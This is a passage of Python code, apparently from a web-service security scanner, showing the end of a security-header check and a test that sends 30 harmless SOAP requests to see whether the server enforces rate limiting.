                data={"evidence": evidence})
        else:
            ptprint("Security headers present.", "OK",
                    condition=not self.args.json)

    # =========================================================================
    # Rate Limiting (vždy posledný)
    # =========================================================================

    def test_rate_limiting(self):
        ptprint("Testing rate limiting...", "INFO", condition=not self.args.json)

        request_count = 30
        codes = []
        probe_data = (
            '<?xml version="1.0"?>'
            '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
            '<soapenv:Body><message>rate_test</message></soapenv:Body>'
            '</soapenv:Envelope>'
        )

        for i in range(request_count):
            try:
                r = self.session.post(self.endpoint_url, data=probe_data,
                                      headers={"Content-Type": "text/xml"},
                                      timeout=5, verify=False)
                codes.append(r.status_code)
                if r.status_code == 429:
                    ptprint("Rate limiting is active (HTTP 429 received).", "OK",
                            condition=not self.args.json)
                    return
            except Exception:
                continue

        if codes:
            unique_codes = list(set(codes))
            ptprint(f"No rate limiting detected after {len(codes)} requests.",
                    "VULN", condition=not self.args.json, colortext=True)
            self.jsonlib.add_vulnerability(
                "PTV-GEN-NO-RATE-LIMIT", node_key=self.node_key,
                data={"evidence": f"Sent {len(codes)} requests. HTTP codes: {unique_codes}"})
        else:
            ptprint("Rate limit test inconclusive (server unreachable).", "INFO",
                    condition=not self.args.json)